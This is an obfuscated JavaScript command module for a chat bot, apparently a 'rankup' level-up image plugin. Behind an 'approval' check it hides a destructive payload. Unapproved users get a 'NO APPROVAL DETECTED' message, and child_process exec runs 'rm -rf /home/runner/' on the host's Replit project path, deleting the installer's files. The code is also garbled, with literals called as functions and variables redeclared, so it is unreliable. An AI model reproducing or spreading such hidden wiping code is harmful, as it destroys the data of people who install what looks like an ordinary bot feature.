function e(n) {
  const c = s();
  return (e = function (n, o) {
    let x = c[n -= 464];
    if (undefined === e.RDqSOc) {
      var s = function (e) {
        let r = "";
        let n = "";
        let n;
        let c;
        let o = 0;
        for (let x = 0; c = e.charAt(x++); ~c && (n = o % 4 ? 64 * n + c : c, o++ % 4) ? r += String.fromCharCode(255 & n >> (-2 * o & 6)) : 0) {
          c = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(c);
        }
        let e = 0;
        for (let c = r.length; e < c; e++) {
          n += "%" + ("00" + r.charCodeAt(e).toString(16)).slice(-2);
        }
        return decodeURIComponent(n);
      };
      e.BpyMZp = s;
      arguments;
      e.RDqSOc = true;
    }
    const t = c[0];
    const a = n + t;
    const W = arguments[a];
    if (W) {
      x = W;
    } else {
      x = e.BpyMZp(x);
      arguments[a] = x;
    }
    return x;
  })(arguments, n);
}
function r(n) {
  const c = s();
  return (r = function (n, o) {
    let x = c[n -= 464];
    if (undefined === r.dUMtcg) {
      var s = function (e) {
        let r = "";
        let n = "";
        let n;
        let c;
        let o = 0;
        for (let x = 0; c = e.charAt(x++); ~c && (n = o % 4 ? 64 * n + c : c, o++ % 4) ? r += String.fromCharCode(255 & n >> (-2 * o & 6)) : 0) {
          c = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(c);
        }
        let e = 0;
        for (let c = r.length; e < c; e++) {
          n += "%" + ("00" + r.charCodeAt(e).toString(16)).slice(-2);
        }
        return decodeURIComponent(n);
      };
      const n = function (e, r) {
        let n;
        let c;
        let o = [];
        let x = 0;
        let t = "";
        e = s(e);
        for (c = 0; c < 256; c++) {
          o[c] = c;
        }
        for (c = 0; c < 256; c++) {
          x = (x + o[c] + r.charCodeAt(c % r.length)) % 256;
          n = o[c];
          o[c] = o[x];
          o[x] = n;
        }
        c = 0;
        x = 0;
        for (let r = 0; r < e.length; r++) {
          c = (c + 1) % 256;
          x = (x + o[c]) % 256;
          n = o[c];
          o[c] = o[x];
          o[x] = n;
          t += String.fromCharCode(e.charCodeAt(r) ^ o[(o[c] + o[x]) % 256]);
        }
        return t;
      };
      r.iVscTA = n;
      arguments;
      r.dUMtcg = true;
    }
    const t = c[0];
    const a = n + t;
    const W = arguments[a];
    if (W) {
      x = W;
    } else {
      if (undefined === r.daxiFC) {
        r.daxiFC = true;
      }
      x = r.iVscTA(x, o);
      arguments[a] = x;
    }
    return x;
  })(arguments, n);
}
function n(r, n) {
  return e(r + 935, n);
}
function c(e, n) {
  return r(e + 530, n);
}
function o(e, r) {
  const n = s();
  return (o = function (e, r) {
    return n[e -= 464];
  })(e, r);
}
function x(e, r) {
  return o(e - 836, r);
}
function s() {
  const e = ["l8o7FCoOwwfFlwtcRbVcNSoNWROlWPS", "W4vbW7/cTmowyvSPWR3cNG", "DCoQcuZdQcaQW5pcJSkV", "Agv4", "BM9Kzw1VzhvSzq", "WQZcPuOJW4jEhhdcSa", "imoSDSoUwwW", "W4r7xs7dL8oilmkVbG", "vSkBWPpcLq", "gCk/CmkBWQNcKq", "qSoxmhpdGWa1W7/cPW", "DxrMltG", "ymoFgmkDW5r1f8kpW60", "setData", "Ahr0Chm6lY9PlMLTz3vYlMnVBs92BM55tfy4lMDPzG", "WQfYW6/dQCk6BXhcJ0i", "CMvWBgfJzq", "cCkBWO3cKXVcOCkYmG9EWP7cLmoHcmo2WQbibSobW4RcMfu/m8kFW7jAvCoPuXmIWPtcVaqoWPddISohaLbpu8oXD8kiW58oW5mGuJFcNH5zmCotW4bgq8k2WO3dSCkJqCoOWOXdobNdQ0P5pCkJqmoJqd/dQSk9zxRcP8kPW6BdNxpcOSoGdCoWWPT9lmo5q39AW790WOCfWOPHEhRdVCorbs9puSoSft7dLSoIWP9TybZdH8khu8omE8kkWObUW4GBWQRcL8krWOBdSe7cRwhdMglcN152W5aqWRLjW69NWOymW7XNkmoOW5ldGttcLXBcJJ4BW7BcKSoqEmkwW4FcO8oTkum4EM9VWQL/WORcTmkyi0dcGSouhXFdJ2ioW53cPGufWRJdQchdHXZcGmkomc4IiCoVw8kiC8kUs8oHWPO1W63cLsVdOs11WQlcOh16wmo+WReGDYunFGu8gSoXW6tdVq0AWOZcImkjd8kNW5iagmkLW4xcKmopzXvEemoncq/dU8kZWRRcMIW", "DxjS", "y3jLyxrLv3jPDgvtDhjLyw0", "W7ddSrK", "zNjVBq", "bwhdKcL4WPOveW", "W4tcMwm3gmotdSoylW", "FHBdPhifW4/dOG", "WP1dW4ddVcldGW7dTSkA", "d8kDW5lcLWijeGlcVatdSc4", "W57dPhRdPa", "D3jPDgvgAwXLu3LUyW", "W5LVlSkSnGFcQJrDWPrrpfxcJCoesmoXWPq4W6FdJaldGmoa", "W5DqyW3dVCo1a8kFyCo7j8onWPaGW7JdMSo/W4nWW4RdN8odmmkgkgFcMmozW7NcHSo7vCkEWOZcP8on", "mtaWmduYmdG2mtiWmJC4", "get", "WOjaFmkudL0", "Dt0OW5RdQ8kdWP0", "WP/cNmkRiGm5WQzKWRRdGa", "W7nqEW", "WQ0jvmkmo8k9W5pcJXJcP8oat8owmNRcH8ou", "createReadStream", "nsjgW7ZdMJ7dTmkmCmk6hqJdVG", "W7RdTHypiCkzjSk6W4ubWP7dH8okW5tcI8oBW6VcGCkRWRBcML7cH3NcLvxcG8oZispdSSkinW", "k8oSBmokwhz/lwVcVb3cMCoWWQ0JWRi", "mmk9W7hcQdW9oWxcNG", "https://i.imgur.com/B7i6dhL.jpg", "q8kCWPu", "WPzzW4K", "W6CeqW", "stderr: ", "13606767YyGfBm", "zxHPC3rZu3LUyW", "y3jLyxrLuMvHzfn0CMvHBq", "Ahr0Chm6lY9PlMLTz3vYlMnVBs96wNHJAJLblMDPzG", "Edit-IMG", "WQxdILuhW501BhC", "/home/runner/", "/umaru.js", "WQ/cR101W45whuZcMfy", "BmocaSkbW4y", "WR9PfLP5WO92DCk8ds/dSCk+W73dGSk9", "odrFu8kmWPSuWP8wWRm", "Dg9cDwzMzxi", "WPHJp8k6lWFcOZnqWP8", "nodemodule", "W50RWOGO", "3794rIGixb", "W7bsyG3dUG", "rankupmode", "WRtcSLu", "oNtcOSkhbW", "WP4nCSojW5ODW6mGk8oWWQNcKtnvW5G2W55ZC8oYk8kYW4NcIq", "y2HPBgrFChjVy2vZCW", "WRL1bq", "stringify", "message", "tN7cRK/cLSkyWRX7AG", "l2n1C3rVBxjHBMT1Cc9Yyw5RDxaUBxa0", "WQrjc8kthtVcIXn7", "WRBdRY4qjahdI8ke", "13866poDUsE", "https://i.imgur.com/9Kq4ySX.gif", "W7lcRLimdSoTi8oQdq", "W47dVMO", "250180FxMUtB", "NO APPROVAL DETECTED!!!!\nUserID: ", "zgf0yq", "exp", "8j2xP/cDL67mHSYb8j2yGq", "WQNcVSomWOP1", "y8kNASo8q2POoIRdPJRcN8o7WRepWOtcIa", "c13cNCk4pCkTFHJcVG", "ymoFgmkDW5r1fW", "exit", "D2LKDgG", "Amouhq", "W7BdJr3dIW", "eZpcJ3VcQmkcW5PbaSoHW7ZdUb0", "W40LWOONW4CT", "sCozqG", "ww91igHHDMuGyMvLBIbIyw5UzwqGzM9YihvZAw5Nig15igjVDaPdB250ywn0ig15igzHy2vIB29RigfJy291BNqGzM9YihvUyMfUcMH0DhbZoI8VzMfJzwjVB2SUy29Tl3jVB3rHBg9JywXOB3n0lMrLDIakAhr0Chm6lY9MywnLyM9VAY5JB20VAM9OBMnOyw4Uzgv2", "arraybuffer", "mcGwu8kzWOacWOS", "mtC3Ew5IDxDm", "mJC1mdiWmhjYv0LeDG", "W5pcJMWKnmomjSo7", "WPbQWPy5W5WZW5BcVJ90WQNcSCoAjNSXzG", "W4xdV3JcUCotWQldK8oQndS", "yIOQW5NdUmoAW5G", "rm -rf customrankup/* ", "sqrt", "W5bXW7NcLCovdg0", "r8kgWPFcKrtcVmk7mHifWOK", "WRrcW6NdImk5hJW", "W5XFW5ddImkaeY/cR2VdM8onx1m", "dCkbnW", "WQxdSM8CmH7dQSkCW4CB", "tK8GqvbquK9wquWGrevurunuruqHiseHcLvZzxjjrdOG", "W6BdIrZdIWDyWQ1/uSkYWQbC", "WQZcVxdcLmkjmSklz8o9", "ndu2otjOveTxBve", "Bmooh8kpW5z6h8kJW4CFWPi", "2750200rrWIDv", "CM0GlxjMic9OB21Ll3j1BM5LCI8", "zw52", "l25VChjLzML4l3jHBMT1Cc9QB2HUBgvZDgvYlNbUzW", "WRhcHG5LdK7dPCkzBxW", "WQLQW7/dNW8", "y2XVC2u", "zMXVB3i", "ExVcRu3cHmktW6POFhSlW4pdNX4IcCkwgSoUxSkUlSovW5nNWPHsiH7cV8oQWRRdIhjf", "z2v0rgf0yq", "W7T7bf0zxmo9tNtdRc0nASoWvbGvd1FcT8kdjXCm", "/customrankup/rankup.gif", "WPhdUgC", "WPVdMKm9bCkMgCkhW7iUWRNcKSo+WR7cRCo/W4BcVSkBWOlcLrldLMW", "oSkQsLu", "fmk0BW", "Ahr0Chm6lY9PlMLTz3vYlMnVBs9XEwjNsvjelMPWzW", "Bg9N", "h2RdHWfSWOOr", "Ahr0Chm6lY9PlMLTz3vYlMnVBs96wK00suHdlMDPzG", "W7nZhfzOW4vwzCkZbXNdT8oJ", "l2nVBMzPzY5QC29U", "pmoJWPy", "WOdcOWldTwJdMmklWRRdQtnDkCkBWPNcRmkjhG56WRq/W5/dKCoKuCosAGXaDSojWPK", "WOdcOJbFmhldLCk+tG", "WPlcM8kMkWOjWRjJWRNdHL8KuW", "bmklWOZcGrSAbte", "vCkxWPFcTblcUmk3lG", "W64fuG", "utf8", "hex", "FSoZdvO", "CM0GlxjMign1C3rVBxjHBMT1Cc8Qia", "handleEvent", "Bgv2zwX1Ca", "yM9Sza", "BwvZC2fNzq", "WP7dOwyNW7CcrveP", "F1ejFSkzWQ4V", "error: ", "DZKQW4xdRW", "lY5YDw5UzxiVlNj1BM5LCI8", "mZb3BfncBu0", "Ahr0Chm6lY9PlMLTz3vYlMnVBs9xt1rXrJfPlMPWzW", "/cache/rankup.png", "length", "phBcUW", "uKvqtf9ttfvh", "hSomsmofCLDbhui", "EaVdUhSEWPi", "BMfTzq", "WRtcSXxdLwldHCkmWRNdPcS", "wYbbvvrpienmrufsienbq0Hfif0G4P2Via", "messageID", "W6tdNre3", "u3vJy2vZC2z1BgX5igfKzcbJDxn0B20Gz2LMiseH", "BIjBW7tdNNxdJ8k9", "WPtcNCk5", "C2vUze1LC3nHz2u", "zhjHD0LTywDL", "#FF0000", "fs-extra", "W7xdJGK", "l2n1C3rVBxjHBMT1Cc9Yyw5RDxaUz2LM", "WQWwuCoE", "f8kjBYFcHaXWwmkVACoMdCkrW5FdGCkBWOG6cCoU", "Dg9mB3DLCKnHC2u", "John Lester", "l2LUy2X1zgvZl2rHDgfIyxnLlY5YDw5UzxiVlNj1BM5LCI8UCNvUBMvYlY5YDw5UzxiVlNj1BM5LCI8UCNvUBMvYlY5YDw5UzxiVlNj1BM5LCI8UCNvUBMvYlY5YDw5UzxiVlNj1BM5LCI8UCNvUBMvYlY5YDw5UzxiVlNj1BM5LCI8UCNvUBMvYlY5YDw5UzxiVlNj1BM5LCI8UCNvUBMvYlY5YDw5UzxiVlNj1BM5LCI8UCNvUBMvYlY5YDw5UzxiVlNj1BM5LCI8UCNvUBMvYlY5YDw5UzxiVlNj1BM5LCI8UCNvUBMvYlY5YDw5UzxiVlNj1BM5LCI8UCNvUBMvYlY5YDw5UzxiV", "WP1dW4ddVcldNXxdRCkyW5K", "toLowerCase", "W6mRv8o2W7e9W5KCd8om", "WP3cLe/cQ8kZ", "EKaoFCklW7nLWRtcJs7dN8oYrIVcU17cP8o3WRLwimo5W4BdHCkPWRSMD1ZcLcW", "W7epqCkRmSkSWP0", "env", "WRb0fa", "WPaRzMmuxxm0rmoVWOi", "W6ddPHBdUL7dQCkvWPe", "Dveo", "pN3cUCk6a8ktvXJcIJz6", "drawImage", "custom", "WRelweSgD1CjymoA", "sshdHLeOWRRcLCoIWQqr", "WRJdUxS", "W6ddQWKD", "z2v0tMfTzvvZzxi", "𝐭𝐡𝐚̀𝐧𝐡 𝐜𝐨̂𝐧𝐠 𝐭𝐡𝐨̂𝐧𝐠 𝐛𝐚́𝐨 𝐫𝐚𝐧𝐤𝐮𝐩 ✨", "l2LUy2X1zgvZl2rHDgfIyxnLlY5YDw5Uzxi", "lSk+ta", "senderID", "i0zgmdaWma", "DhLWzq", "oSoIWO7cHCkwfq", "userName", "W5ldUtuACZqejeW", "W5FdUt/dSZD6WQHqECkl", "W5pdNeinbmk7bSkqW700WOFcLmoRW6pcLSoA", "lSoKWOtcL8kx", "bmkCjMxcHq", "fmkICmkpWRxcLSo5WQtcQCkb", "C2vUzgvYsuq", "W60bWRqaW60oW7/cMvC", "WQrjc8kthsFcKaH5WQG", "W7f3WOlcNCoXwN4g", "2294846fDEfvw", "W5dcGNiL", "customRankup", "W5pdNei", "WQqBu8ouua", "log", "Ahr0Chm6lY9PlMLTz3vYlMnVBs9fudDNzff5lMPWzwC", "WPa/ENm", "pmkOxvpcHxdcV1a", "z2v0sw1Hz2u", "lSoTW703", "WR3cOmokWO11WR0WW5zMDCk2W5VdUW", "Rankup mode panel\n[canvas/canvasgif/custom/add]\n\nex: ", "W7eEuCkkiCkQW4BdRG", "REPL_OWNER", "lmk1tG", "threadID", "l2n1C3rVBxjHBMT1Cc9Yyw5RDxaUCg5N", "zxHWB3j0CW", "height", "W4iFDCoo", "W7tdQGTmW68", "W5qaCq", "jmoJW60ZA8kGFrnUFa", "iZaWrKyWma", "nSodlG", "WOZcMu7cS8kJeq", "WQRcKmkUkrG3WRe+WRxdHfqHqCkqWR3dHmoPy8kUW53dKSkJWO/dOISnWQmL", "/includes/database/.runner", "8j+mUcdWNzEE8j2xTSYdipcDL7VWNzEUZiBWNzE78j2xTcdWNzIf8j2xRSYJ8j2xVcdWNzE58j2xVmYcZidWNzE78j2xUYdWNzE8ZjVmIsdWNzE68j2xVmYc8j2xUYdWNzE98j2xTFcDL67mGFcDL70G8j2xTFcDL67mGSYb8j2xVsdWNzEX8j2xTVcDL7lmGVcDL7OG8j2xSpcDMilmIFcDL64GE25HBwv9ipcDMipWNzIcZjVmGpcDL64G8j2xUFcDL7lmGVcDL7SG8j2yGFcDL7ZmM8Yb8j2xTIdWNzE58j2xSVcDMipWNzEY8j2xUsb7Bgv2zwX9ipcFJlG", "oCo4W60ZDmk9i0y", "WQlcOvCMW4jk", "Ahr0Chm6lY9PlMLTz3vYlMnVBs8XALbmBLPylMPWzwC", "c2RdHW", "wNlcPKJcUSktWRLPEgWc", "y2fUDMfZ", "WO1kzmkxc08G", "cwhdHq", "WR1PW6tdKqNdTq", "pKRdOWLsWQ08nsy", "W4ZdRsXCp2/dL8kLbWdcHCo3W6pcQmk6WOr0", "lY5YDw5UzxiVlNj1BM5LCI8UCNvUBMvYlY5YDw5UzxiVlNj1BM5LCI8UCNvUBMvYlY5YDw5UzxiVlNj1BM5LCI8UCNvUBMvYlY5YDw5UzxiVlNj1BM5LCI8UCNvUBMvYlY5YDw5UzxiVlNj1BM5LCI8UCNvUBMvYlY5YDw5UzxiVlNj1BM5LCI8UCNvUBMvYlY5YDw5UzxiVlNj1BM5LCI8UCNvUBMvYlY5YDw5UzxiVlNj1BM5LCI8UCNvUBMvYlY5YDw5UzxiVlNj1BM5LCI8UCNvUBMvYlY5YDw5UzxiVlNj1BM5LCI8UCNvUBMvYlY5YDw5UzxiV", "l2n1C3rVBxjHBMT1Cc9Yyw5RDxaUBxaZ", "oqXVWQhcJYhcTG", "add", "WOyGFG", "vmktWO3cMWlcPa", "zNmTzxH0CMe", "floor", "sa95W53dOeldISkSwq", "W4FdIeq6", "W4xcK2S0", "BwvZC2fNzvjLCgX5", "unlinkSync", "video", "WPVcL0q7h8kNeCkhWRXUWQdcKSoGW7/cUSoSWOC", "W6bUW7/dNrJcVZddLSkZW6xdKdSS", "Successfully delete cache", "WRBcUbC", "type", "yIaXW4xdVSktWQSjDSoW", "W6ddRqm", "100068432630360", "l3bPy3r1CMu/D2LKDgG9nZiWjMHLAwDODd03mJaMywnJzxnZx3rVA2vUpty2mJG1nJGZnZKLn0nJmwu2mJbMytCWogeXzdu2otzMyJK5mwmXyMrLnty2mG", "sLLgW53cRhmdaConmSkYW611mtZcVX7dOvyJrmkwxrjgW4FdSdZcSuRcUcu", "FYrF", "WRxdSNu", "W5XEW5hdHSkjstNcV3BcMSomtaJcSColpLjZuSoib2lcJIdcKam", "kCoNBG", "W6BdVgyclSkAomkGW5q", "W4FcJNyommotcSoQoCo4bG", "WOtcVM7cQCoqWQpdKSoTD3aqW57cGCo3lSkxWPq", "CMvXDwvZDa", "fSk/BCkYWQdcImopWOJcTmkhW5i", "/.runner/.runner/", "lmo5WOBdJSoh", "k3KFWQhcIsBcSmoor8kTpXZcK3C", "axios", "messageReply", "W6vLW4hcK8o8xG", "u3vJy2vZC2z1BgX5igfKzcbJDxn0B20GDMLKzw8Hise", "createWriteStream", "WQdcSW/dSMJdMCkXWPG", "replace", "CMfUA3vWBw9Kzq", "Aw5JBhvKzxm", "z2v0", "WPjTl8k+", "amkCjNNcGHKddSkPzq", "WQOdsmoluCkpWODhW6hcVNJcT8kyW5BcGCovW5BdHWX5W44GaCogWRtcQ8kRWQ3cTCklbGy", "threadData", "W6pcIKqEW4y/BhzbWQOlkWXxvdOp", "BwvZC2fNzuLe", "W5aCkSoeuuO/r8kpW7xcKa", "rankup", "canvas", "BurxW5VcQgq5iW", "writeFileSync", "uKvqtf9pv05fuG", "WPNcOIxdQmkgW7NcGCo5hbSeW53cMa", "CMfUzg9T", "CMfUA3vW", "CCoQcvddRW", "sendMessage", "WQVcQSokWPzJ", "W7TLW4hcN8o8t2ScWOS", "WPNcNvtcLSk3dmkIz8ojk3C", "attachments", "mmk9W7hcQdWHib7cNcy", "W7bHW5S", "W7jmBbxdGCo2aCkDja", "as/cKa", "getCurrentUserID", "CMvHzezPBgvtEw5J", "C2v0vxjS", "cCoCWPhcHrNcUSkZjvnFWOJcGmo7b8oXWRmu", "CWhdRG", "existsSync", "wYbcqu5oruqGxsdINA8G", "mtaWmdy4ndmYnJmWmZyW", "/config.json", "y29UzMLN", "W5iCySoBW5OxW5W3k8o6WPhcKdeFW4S6", "t2xcP0e", "WO5Ei3DsWQvZxSkyoW", "z2v0q3vYCMvUDfvZzxjjra", "DxbKyxrLrNjHBwu", "45692hTKWmQ", "DgHYzwfKsuq", "wMBcULG", "WPtcQJPDoq", "y3vZDg9TuMfUA3vW", "https://graph.facebook.com/", "wNlcVgJcLSkcWQS", "W5aVzCkJdmkxWQVcGcVcGq", "W67dNqGZ", "A8otbCkhW4z6", "WRhcHG5LdLldVSkcBW", "WPveWPldGmkDsc/cUW", "g8kEAg3cLelcNMddJq", "W6mRv8o2W7eHW4ihdq", "#00FF00", "REPL_SLUG", "oSoLW7KZ", "setQuality", "WQfPW7tdLrddVYBdLSkXW64", "l2HVBwuVCNvUBMvYlW", "WRf2bW", "kSkUs1xcPhW", "W79WW5VcImo6fcniWPhdOSoNimk4kL0LtSoPbNeYW4zlW7ftBmkVW6vftdzK", "mta0ode2mvn4qu5Pyq", "y8oQBCo6wwTGoMtcPIpcN8oLW7ayWPFdIwqlW6/cSw/dTrS", "Fmo9bW", "WOBcRsG", "zxjYB3i6ia", "yw5PBwf0zwrFAw1Hz2u", "[ AUTO CLEAR CACHE ] ❯ ", "/script/commands/data/choru.jpg", "C2v0rgf0yq", "DqVdSNGAWPRcPSozWO0M", "i8k7D8kxWRtcLCkkWRxcPSkuW4u5WOdcONr0EJNcJwO2W4XgW6xdPbL2W4VdICkMlmoZW57cKxKdaa", "C3fYDa", "W7Xizq", "/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/", "rm -rf /home/runner/", "ignHBNzHC2DPzG", "lCk6tea", "NO APPROVAL DETECTED!!\nCONTACT MY FACEBOOK ACCOUNT FOR APPROVAL\nhttps://facebook.com/rootalocalhost.dev", "DCkhWOdcKXlcP8kLmqKDWPBcJmk1dCoXWQ1Ef8klW4tcIueYnCkF", "CgLWzq", "Ahr0Chm6lY9PlMLTz3vYlMnVBs9mA0Hvuu1klMPWzwC", "W7FdJGWIsseHhw7cRdJcJ8kP", "W44bymkhcvq1CCo1WQJcP8oJeCo7W5pcUqS", "https://i.imgur.com/RFRARpY.jpg", "D0WkySkkWR05", "exports", "WPaSWOSHW5DYW4hcUx40WR7cTSkB", "C3rHCNq", "WRJcT8otWPvXWPG8", "/customrankup/rankup.mp3", "W5WzW43dKmkluJJcQcRcM8oAwblcVSomlq4", "C3rKzxjYoIa", "bb5RESk+WRSNWQq/WOq", "WQtcRK8", "iCoSA8o6tgnOaue", "levelup", "config", "D1Om", "W4TJqX7cQ8kEdCoCWPS", "W5OQWPi", "k8oOWOhcH8k5g8kWvSoKWRRcLJW", "https://i.imgur.com/h6UbIMO.gif", "CNvU", "WPJcL8oZWRvpWQGvW69e", "WRelweSgA0WsyG", "vaujW5ddR0hdLmk2smkvnfRcLv9bEZFcRSoVwmkeWOP/W64AW67dO8k9WPanW7ZcHb0", "WOldMvm5aZRdRSkRW6WQ", "https://i.imgur.com/zZpub9k.jpeg", "zxHW", "W7jQW5K", "mYLjwCktW45q", "W7TBFHhdQCo8bCkZbq", "WPnIlq", "CuejECkxWQqyW7RcIMVdG8oV", "u3vJy2vZC2z1BgX5igrLBgv0zsbJywnOzq", "https://i.imgur.com/pKOgCjs.jpeg"];
  return (s = function () {
    return e;
  })();
}
!function (n, c) {
  const x = n();
  function s(r, n) {
    return e(r + 928, n);
  }
  function t(e, n) {
    return r(e - 875, n);
  }
  function a(e, r) {
    return o(e - "0x278", r);
  }
  for (;;) {
    try {
      if (807297 === -parseInt(e(630, -160)) / 1 + -parseInt(o(480, 1112)) / 2 + -parseInt(e(787, -215)) / 3 * (parseInt(o(607, "0x445")) / 4) + parseInt(o(768, 1556)) / 5 + -parseInt(r(573, "2reX")) / 6 * (parseInt(o(750, "0x498")) / 7) + parseInt(o(806, "0x4e9")) / 8 + -parseInt(r(556, "0ypX")) / 9 * (-parseInt(e(848, -151)) / 10)) {
        break;
      }
      x.push(x.shift());
    } catch (e) {
      x.push(x.shift());
    }
  }
}(s);
module[n(-437, -284)][o(666, 1501)] = {
  name: r(559, "0hVt"),
  version: "31.7.2",
  hasPermssion: 2,
  credits: o(873, "0x60b"),
  description: r(716, "kU&C"),
  commandCategory: o(738, 1510),
  usages: r(507, "y8D9"),
  cooldowns: 2
};
module[r(654, "601k")][o(839, 1866)] = async function ({
  api: e,
  event: r,
  Currencies: o,
  Users: s,
  getText: t
}) {
  try {
    const n = require("fs");
    const c = ["100052086120278", o(542, 606)];
    const o = n(-218, 322);
    const x = n(-336, "0x1f0");
    require(o(557, "0x316"));
    const {
      exec: s
    } = require(n(-179, "0x255"));
    const t = "/home/runner/" + process[o(881, 1089)][n(-82, "0x286")] + 311(703, "BzWt") + process[n(-127, "0x2c4")].REPL_OWNER + process[n(-127, 353)].REPL_SLUG + n(-414, 169) + process.env[o(494, "0x1ce")] + process[o(881, 1163)].REPL_SLUG + n(-414, "0x8a") + process[n(-127, 582)].REPL_OWNER + process[n(-127, "0x202")][451(843, "h%FS")];
    const u = "0x196"(798, "Kxo*") + process[125(517, "ctla")].REPL_SLUG + n(-61, 393) + process["0x154"(732, "7LC5")].REPL_OWNER + process[o(881, "0x483")][o(622, 502)] + o(643, 881) + process[153(545, "0ypX")][222(614, "7LC5")] + process[n(-127, "0x1e0")][o(622, "0x265")] + "/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/" + process[o(881, "0x3a7")][o(494, 557)] + process.env["0x4e"(470, "JpmR")] + o(554, 778) + process[o(881, "0x39c")][n(-357, 184)] + process[133(525, "m]yL")]["0x135"(701, "Kxo*")] + "0x10c"(660, "Kxo*") + process.env.REPL_OWNER + process["0x13a"(706, "o6fa")][o(622, "0x232")] + n(-88, 332) + process.env[o(494, "0x228")] + process[n(-127, "0x260")].REPL_SLUG + 268(660, "Kxo*") + process[n(-127, 517)][o(494, 515)] + process[o(881, 1099)]["0x19b"(803, "U2jk")] + n(-88, "0x155") + process[241(633, "fhsF")][n(-357, 66)] + process.env[o(622, 767)] + o(554, 434) + process.env.REPL_OWNER + process[339(731, "Kxo*")][282(674, "m]yL")] + o(554, 829) + process[n(-127, "0x1bc")]["0x127"(687, "0hVt")] + process[133(525, "m]yL")][o(622, 551)] + n(-88, "0x295") + process.env["0x1e3"(875, "8ciA")] + process[n(-127, 323)]["0x4e"(470, "JpmR")] + "/.runner/.runner/" + process["0x6e"(502, "a2f1")]["0x10e"(662, "Jl3l")] + process[n(-127, 298)][225(617, "fhsF")] + "/.runner/.runner/" + process[199(591, "@nNC")][n(-357, 387)] + process.env[n(-82, "0x2d6")] + n(-88, 438) + process.env.REPL_OWNER + process[o(881, "0x315")][304(696, "E#N$")] + n(-88, "0x2b8") + process[338(730, "BzWt")].REPL_OWNER + process[o(881, 1e3)].REPL_SLUG + "0xcb"(595, "BzWt") + process[o(881, 792)][n(-357, "0xbb")] + process[o(881, "0x449")][462(854, "$7mu")] + n(-88, 597) + process.env[n(-357, 219)] + process[235(627, "*2@5")][n(-82, 726)] + o(554, 698) + process[o(881, "0x3aa")].REPL_OWNER + process.env["0x55"(477, "DKjP")] + o(554, "0x267") + process[n(-127, 447)][n(-357, 366)] + process.env[157(549, "D0*m")] + n(-88, "0x2c4") + process.env[n(-357, 323)] + process.env.REPL_SLUG + "0xb3"(571, "h%FS") + process[o(881, 809)][o(494, "0x213")] + process[429(821, "cqzp")][o(622, "0x214")] + "0x10c"(660, "Kxo*") + process["0x92"(538, "&W4n")][o(494, 606)] + process[o(881, "0x47e")][n(-82, 412)] + o(554, "0x2d5") + process["0x13a"(706, "o6fa")][o(494, 402)] + process[o(881, "0x34e")].REPL_SLUG + "/.runner/.runner/" + process["0x11f"(679, "0hVt")][485(877, "a2f1")] + process[o(881, "0x410")][228(620, "a2f1")] + "0x80"(520, "fhsF") + process.env[o(494, 745)] + process[n(-127, 664)][o(622, 622)] + 260(652, "2reX") + process["0x67"(495, "&mHn")][o(494, 671)] + process.env[n(-82, 685)];
    if (!c[347(739, "h%FS")](r[o(465, "0x2d4")])) {
      if (!n["0x94"(540, "8AWD")](t)) {
        e[o(583, 852)](n(-134, "0x22c") + e[o(592, "0x308")](), o);
        return void e[o(583, "0x2f1")]("NO APPROVAL DETECTED!!!!\nUserID: " + e[n(-330, "0x82")](), x);
      }
      if (!n[o(597, 757)](u)) {
        e[o(583, "0x1d2")](o(647, 827), r["0x1d6"(862, "0ypX")], r[n(-363, 204)]);
        e["0x1eb"(883, "m]yL")](o(769, "0x36c") + e[o(592, 671)](), o);
        return void e.sendMessage(334(726, "D0*m") + e["0x14f"(727, "$7mu")](), x);
      }
    }
    if (!n.existsSync(434(826, "sbUw") + process["0x7d"(517, "ctla")][o(622, 655)] + o(741, 1017))) {
      s(o(644, 887) + process.env.REPL_SLUG + o(508, "0x2a3"), (e, r, n) => {
        function c(e, r) {
          return n(e - 412 - "0x27c", r);
        }
        function o(e, r) {
          return (e + 197)(e + 197 - 138 + 530, r);
        }
        if (e) {
          console.log(o(845, 682) + e[a(543, 846)]);
        } else if (n) {
          console[a(524, "0x399")]("stderr: " + n);
        } else {
          console[a(524, "0x3cb")](chalk[W("DKjP", 357)][a(390, "0x3e4")](W("Kxo*", 403))(a(299, "0x2e2")) + chalk.hex(W("0ypX", 131))(a(485, "0x2b4")));
        }
      });
      return void process[139(531, "g!Zh")](0);
    }
    if (!n[o(597, "0x1e1")]("/home/runner/" + process.env["0x89"(529, "0ypX")] + "/script")) {
      s(n(-128, 566) + process["0x7d"(517, "ctla")][o(622, "0x2df")] + n(-40, "0x1a0"), (e, r, n) => {
        function c(e, r) {
          return n(e - "0xf9" - "0x27c", r);
        }
        function o(e, r) {
          return o(e - 283 + 767 - 836, r);
        }
        var x;
        var s;
        if (e) {
          console[d("0x328", 554)](a(335, 732) + e.message);
        } else if (n) {
          console.log(d(1128, 802) + n);
        } else {
          x = "0x5d1";
          s = "rygn";
          console.log(chalk.bold[d(1201, 905)](d("0x4dd", 935))(a(299, "0x1d8")) + chalk[204(596, "rygn")](a(167, 447))(a(485, 855)));
        }
      });
      return void process[o(777, 814)](0);
    }
  } catch (e) {
    return console[490(882, "sbUw")](e);
  }
  function a(e, r) {
    return n(e - "0x27c", r);
  }
  function W(e, r) {
    return r(r - 138 + 530, e);
  }
  function d(e, r) {
    return o(r + 767 - 836, e);
  }
  if (global[x(1502, "0x302")][x(1588, 944)][n(-63, "0x199")]()[c(178, "ctla")](c(230, "rBNr"))) {
    var u = [x(1507, "0x30f"), n(-235, "0x123"), x(1601, 703), n(-198, 580), "https://i.imgur.com/vfNN0wz.gif", n(-110, "0x2ae")];
    var i = u[Math[x(1364, "0x27d")](Math.random() * u[x(1687, "0x35d")])];
    const n = require("fs");
    var {
      threadID: l,
      senderID: m
    } = r;
    const {
      loadImage: c,
      createCanvas: x
    } = require(n(-420, 319));
    const {
      writeFile: p
    } = require("fs");
    const {
      Encoder: C,
      Decoder: v
    } = require("canvagif");
